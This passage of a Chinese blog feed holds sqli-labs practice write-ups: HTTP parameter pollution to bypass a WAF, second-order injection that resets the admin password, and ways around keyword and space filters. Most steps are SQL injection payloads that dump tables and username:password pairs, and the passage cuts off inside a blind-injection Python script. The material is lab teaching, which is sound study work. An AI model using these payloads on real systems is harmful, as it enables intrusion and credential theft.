align="center">ASP&#x2F;IIS</td><td align="center">Request.QueryString(“par”)</td><td align="center">All(comma-delimited string)</td></tr></tbody></table><h2 id="HTTP参数处理"><a href="#HTTP参数处理" class="headerlink" title="HTTP参数处理"></a>HTTP参数处理</h2><p>在与服务器进行交互的过程中，客户端往往会在GET&#x2F;POST请求中带上参数。通常在一个请求中，同名参数只会出现一次，但是在HTTP协议中是允许同名参数多次出现的。</p><p>例：对于<code>index.jsp?id=1&amp;id=2</code>请求</p><p>对于上图服务器配置情况，客户端请求首先过 tomcat，tomcat 解析第一个参数，接下来 tomcat 去请求 apache（php） 服务器，apache 解析最后一个参数。返回的数据也就是 apache 处理的数据，id&#x3D;2。</p><h2 id="HTTP参数污染（HPP）"><a href="#HTTP参数污染（HPP）" class="headerlink" title="HTTP参数污染（HPP）"></a>HTTP参数污染（HPP）</h2><p>由于服务器两层架构，往往tomcat服务器进行数据的过滤和处理，功能类似为一个WAF，通常利用此特性进行WAF绕过。</p><hr><h2 id="HPP靶场"><a href="#HPP靶场" class="headerlink" title="HPP靶场"></a>HPP靶场</h2><p>记录一下Less-29–Less-31靶场的HPP</p><h2 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h2><p>首先Less-29也是弄了好长时间，也看了很多文章，由于是基于HPP的靶场，最重要的就是没有搭建Tomcat+Java+Mysql的环境，开始弄了好久。（最好是搭建好环境玩Less-29的靶场）</p><p>首先需要打开login.php文件，不然这Less-29和Less-1没什么区别</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-29&#x2F;login.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210144543097.png" alt="image-20220210144543097"></p><p>判断注入点：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-29&#x2F;login.php?id&#x3D;1&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这是提示赶走这个愚蠢的黑客，WAF成功阻拦攻击。</p><p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210144634455.png" alt="image-20220210144634455"></p><p>（这里若搭建好Tomcat+Java+Mysql环境的话如下图：）</p><p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210144917098.png" alt="image-20220210144917098"></p><p>从跳转到<code>.jsp</code>页面可以看出来是 Tomcat 服务器，一般来说，现在没有拿 jsp 写后台的了，大都用 php ，我们果断猜测是双服务器。（从这里才能判断这是双服务器）</p><p>参考原文：<a href="https://www.cnblogs.com/li2019/p/12378585.html">https://www.cnblogs.com/li2019/p/12378585.html</a></p><h2 id="绕WAF"><a href="#绕WAF" class="headerlink" title="绕WAF"></a>绕WAF</h2><p>这里已经知道第一个接收第一个参数的服务器是tomcat，接下来要构造payload进行绕过WAF。</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-29&#x2F;login.php?id&#x3D;1&amp;id&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到页面回显的是第二个用户名和密码，此时接收参数的服务器是apache，接受了id&#x3D;2</p><p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210145231054.png" alt="image-20220210145231054"></p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>判断字段数：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-29&#x2F;login.php?id&#x3D;1&amp;id&#x3D;2&#39; order by 4--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于对id值的处理需要<code>&#39;</code>，所以第二个参数需要进行单引号闭合</p><p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210145744817.png" alt="image-20220210145744817"></p><p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210145819240.png" alt="image-20220210145819240"></p><p>判断回显点：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-29&#x2F;login.php?id&#x3D;1&amp;id&#x3D;-2&#39; union select 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210150050418.png" alt="image-20220210150050418"></p><p>后续过程的payload与以往相同。</p><hr><h2 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h2><p>Less-30与Less-29原理相同，只是对id值做了<code>&quot;</code>处理。</p><p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210150434136.png" alt="image-20220210150434136"></p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-30&#x2F;login.php?id&#x3D;1&amp;id&#x3D;2http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-30&#x2F;login.php?id&#x3D;1&amp;id&#x3D;2&quot; order by 4--+http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-30&#x2F;login.php?id&#x3D;1&amp;id&#x3D;-2&quot; union select 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><p>Less-31对id值进行了<code>&quot;)</code>的处理。</p><p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210150938265.png" alt="image-20220210150938265"></p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-31&#x2F;login.php?id&#x3D;1&amp;id&#x3D;2http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-31&#x2F;login.php?id&#x3D;1&amp;id&#x3D;2&quot;) order by 4--+http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-31&#x2F;login.php?id&#x3D;1&amp;id&#x3D;-2&quot;) union select 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>POST注入-二次注入</title>
      <link href="/2022/02/09/POST%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/02/09/POST%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><p>##二次注入原理</p><p>二次注入，主要分为两步；</p><p><strong>第一步：插入恶意数据</strong></p><p>​        第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，但是addslashes有一个特点就是虽然参数在过滤后会添加 “\” 进行转义，但是“\”并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据；</p><p><strong>第二步：引用恶意数据</strong></p><p>​        在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。</p><h2 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h2><p>由源码可得<code>username</code>和<code>password</code>字段使用了函数<code>mysql_real_escape_string()</code>对特殊字符进行了转义<strong>（mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。）</strong></p><p><img src="/2022/02/09/POST%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/image-20220209115311975.png" alt="image-20220209115311975"></p><p>插入数据库的恶意数据被数据库执行的语句：</p><p><img src="/2022/02/09/POST%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/image-20220209120153561.png" alt="image-20220209120153561"></p><h2 id="插入恶意数据"><a href="#插入恶意数据" class="headerlink" title="插入恶意数据"></a>插入恶意数据</h2><p>将<code>admin&#39;#</code>进行注册，插入数据</p><p><img src="/2022/02/09/POST%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/image-20220209120745781.png" alt="image-20220209120745781"></p><p><img src="/2022/02/09/POST%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/image-20220209121134239.png" alt="image-20220209121134239"></p><h2 id="引用恶意数据"><a href="#引用恶意数据" class="headerlink" title="引用恶意数据"></a>引用恶意数据</h2><p>数据库执行以下恶意语句：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE users SET PASSWORD='123456' where username='admin'#' and password='' "</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>相当于执行的是：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> "<span class="token constant">UPDATE</span> users <span class="token constant">SET</span> <span class="token constant">PASSWORD</span><span class="token operator">=</span><span class="token string single-quoted-string">'123456'</span> where username<span class="token operator">=</span><span class="token string single-quoted-string">'admin'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/09/POST%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/image-20220209121233408.png" alt="image-20220209121233408"></p><p><img src="/2022/02/09/POST%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/image-20220209121254617.png" alt="image-20220209121254617"></p><p>可见<code>admin</code>密码已被修改</p>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入-关键字过滤的注入</title>
      <link href="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h2 id="关键字过滤的注入"><a href="#关键字过滤的注入" class="headerlink" title="关键字过滤的注入"></a>关键字过滤的注入</h2><p>Less-23—Less-28a（Less-24除外）都是基于关键字过滤的注入，源码当中将<code>--，#，or，and</code>等关键字都过滤掉了，在这样的基础上进行 SQL注入。</p><h2 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h2><p>由源码可以看到，接收到的<code>id</code>值将被函数<code>preg_replace()</code>进行过滤，若<code>id</code>值当中有<code>#和--</code>将被会替换为<code>&quot;&quot;</code>，以至于注释符不能使用。</p><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220208234828450.png" alt="image-20220208234828450"></p><p>没过滤时报错：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;1&#39; --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220208235912625.png" alt="image-20220208235912625"></p><p>过滤时报错：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-23&#x2F;?id&#x3D;1&#39; --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209000031064.png" alt="image-20220209000031064"></p><h2 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h2><p>探测注入点：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-23&#x2F;?id&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于没有注释符，只能够将<code>sql</code>语句中的单引号闭合进行注入，这里回西安正常，注入成功。</p><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209000146410.png" alt="image-20220209000146410"></p><p>判断回显点：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-23&#x2F;?id&#x3D;-1&#39; union select 1,2,&#39;3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209001511727.png" alt="image-20220209001511727"></p><p>爆库名和版本号：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-23&#x2F;?id&#x3D;-1&#39; union select 1,database(),&#39;version()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-23&#x2F;?id&#x3D;-1&#39; union select 1,version(),&#39;3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于第一条语句第三个字段闭合单引号后形成字符串被代入数据库执行，导致爆出的只是字符串，回显点只能利用第二个字段。</p><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209001713576.png" alt="image-20220209001713576"></p><p>爆表名：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-23&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() limit 0,1),&#39;3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于不能使用注释符，只能够在第二个回显字段进行嵌套子查询爆表名。</p><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209002320153.png" alt="image-20220209002320153"></p><p>爆列名：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-23&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),&#39;3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209002936700.png" alt="image-20220209002936700"></p><p>爆内容：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-23&#x2F;?id&#x3D;-1&#39; union select 1,(select concat(username,&#39;:&#39;,password) from security.users limit 0,1),&#39;3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209003131337.png" alt="image-20220209003131337"></p><hr><h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><p>源码中，<code>id</code>值将<code>or</code>和<code>and</code>关键字进行了过滤：</p><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209123042616.png" alt="image-20220209123042616"></p><h2 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h2><p>1、绕过<code>or</code>和<code>and</code>一般思路：</p><p>（1）大小写变形 <code>Or,OR,oR</code> </p><p>（2）编码，<code>hex，urlencode</code> </p><p>（3）内联注释<code>/*or*/</code> </p><p>（4）利用符号 <code>and=&amp;&amp; or=||</code></p><p>（5）双写绕过<code>oorr</code>,<code>aandnandd</code></p><p>2、由于对空格的过滤，可以使用：</p><p><code>%09 TAB 键（水平）</code> </p><p><code>%0a 新建一行</code> </p><p><code>%0c 新的一页</code> </p><p><code>%0d return 功能</code> </p><p><code>%0b TAB 键（垂直）</code> </p><p><code>%a0 空格</code></p><p>内联注释举例：</p><p><strong>&#x2F;* *&#x2F; 在mysql中是多行注释 但是如果里面加了! 那么后面的内容会被执行</strong>，如图：</p><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209124343808.png" alt="image-20220209124343808"></p><h2 id="具体步骤-1"><a href="#具体步骤-1" class="headerlink" title="具体步骤"></a>具体步骤</h2><p>这里使用<code>and=&amp;&amp; or=||</code>进行绕过：<br>判断注入点：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-25&#x2F;?id&#x3D;-1&#39; || 1&#x3D;1 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209125309356.png" alt="image-20220209125309356"></p><p>判断字段数：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-25&#x2F;?id&#x3D;1&#39; oorrder by 4--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>判断字段数时由于<code>order</code>字段有关键字<code>or</code>，这里使用双写绕过。</p><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209125448678.png" alt="image-20220209125448678"></p><p>判断回显点：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-25&#x2F;?id&#x3D;-1&#39; union select 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆库爆版本号：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-25&#x2F;?id&#x3D;-1&#39; union select 1,database(),version()S--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆表：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-25&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema&#x3D;database() limit 0,1),3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆字段：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-25&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆内容：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-25&#x2F;?id&#x3D;-1&#39; union select 1,2,group_concat(username,&#39;:&#39;,passwoorrd) from security.users--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><p>源码中没有对<code>id</code>值做任何处理，这里使用双写绕过。</p><p>这里还对报错回显进行了过滤，报错注入不能用。</p><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209131453709.png" alt="image-20220209131453709"></p><h2 id="具体步骤-2"><a href="#具体步骤-2" class="headerlink" title="具体步骤"></a>具体步骤</h2><p>判断注入点：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-25a&#x2F;?id&#x3D;1 aandnandd 1&#x3D;1 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209131348169.png" alt="image-20220209131348169"></p><p>判断回显点：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-25a&#x2F;?id&#x3D;-1 union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209131643275.png" alt="image-20220209131643275"></p><p>（<code>union</code>字段前面的语句不是为了报错，要使用正确的语法但不存在的字段）</p><p>这里除了使用联合注入，还可以使用时间盲注和布尔盲注。</p><hr><h2 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h2><p>源码中过滤如下：</p><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209132949609.png" alt="image-20220209132949609"></p><p>这里的思路应该是将Less-23和Less-25的payload结合一下即可。</p><h2 id="具体步骤-3"><a href="#具体步骤-3" class="headerlink" title="具体步骤"></a>具体步骤</h2><p>判断注入点：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-26&#x2F;?id&#x3D;1&#39; oorr &#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209133231652.png" alt="image-20220209133231652"></p><p>判断字段数：</p><p>由于对空格的过滤，可以使用：</p><p><code>%09 TAB 键（水平）</code> </p><p><code>%0a 新建一行</code> </p><p><code>%0c 新的一页</code> </p><p><code>%0d return 功能</code> </p><p><code>%0b TAB 键（垂直）</code> </p><p><code>%a0 空格</code></p><p>这些编码进行绕过，但由于window下apache解析的问题，这些编码都不能进行解析，导致绕过失败（可以放在linux平台下，这些编码都可进行绕过）</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-26&#x2F;?id&#x3D;1&#39;%0b oorrder%0bby%0b&#39;4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209135200276.png" alt="image-20220209135200276"></p><p>由于判断字段数或者联合注入这些payload都避免不了用到空格，所以这里使用报错注入。</p><p>爆库：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-26&#x2F;?id&#x3D;-1&#39;||extractvalue(1,concat(0x7e,(database()),0x7e))||&#39;1&#39;&#x3D;&#39;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里使用双写绕过的话会使用到<code>空格</code>，所以，在使用<code>oorr</code>的地方使用<code>||</code>进行绕过</p><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209140223254.png" alt="image-20220209140223254"></p><p>爆表：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-26&#x2F;?id&#x3D;-1&#39;||extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema&#x3D;database())),0x7e))||&#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里爆表的时候由于不能使用空格，每一条查询语句只能够使用<code>()</code>来代替。</p><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209141154698.png" alt="image-20220209141154698"></p><p>爆字段：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-26&#x2F;?id&#x3D;-1&#39;||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name&#x3D;&#39;users&#39;)),0x7e))||&#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆内容：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-26&#x2F;?id&#x3D;-1&#39;||extractvalue(1,concat(0x7e,(select(group_concat(username))from(users)),0x7e))||&#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-26&#x2F;?id&#x3D;-1&#39;||extractvalue(1,concat(0x7e,(select(group_concat(password))from(users)),0x7e))||&#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><p>源码将报错过滤掉，导致报错注入失效：</p><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209144348906.png" alt="image-20220209144348906"></p><h2 id="具体步骤-4"><a href="#具体步骤-4" class="headerlink" title="具体步骤"></a>具体步骤</h2><p>判断注入点：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-26a&#x2F;?id&#x3D;1&#39;)||(&#39;1&#39;)&#x3D;(&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209144158468.png" alt="image-20220209144158468"></p><p>这里报错注入用不了，在windows平台下使用时间盲注或者布尔盲注进行注入，使用编码注入只能换到linux平台下进行，payload与以往相同。</p><p>布尔盲注脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">getPayload</span><span class="token punctuation">(</span>char_index<span class="token punctuation">,</span> <span class="token builtin">ascii</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 系统表中数据</span>    info_database_name <span class="token operator">=</span> <span class="token string">"infoorrmation_schema"</span>    info_table_name <span class="token operator">=</span> <span class="token string">"schemata"</span> <span class="token comment"># schemata / tables / columns</span>    info_column_name <span class="token operator">=</span> <span class="token string">"schema_name"</span> <span class="token comment"># schema_name / table_name / column_name</span>        <span class="token comment"># 注入表中数据</span>    database_name <span class="token operator">=</span> <span class="token string">"security"</span>    table_name <span class="token operator">=</span> <span class="token string">"users"</span>    column_name <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token 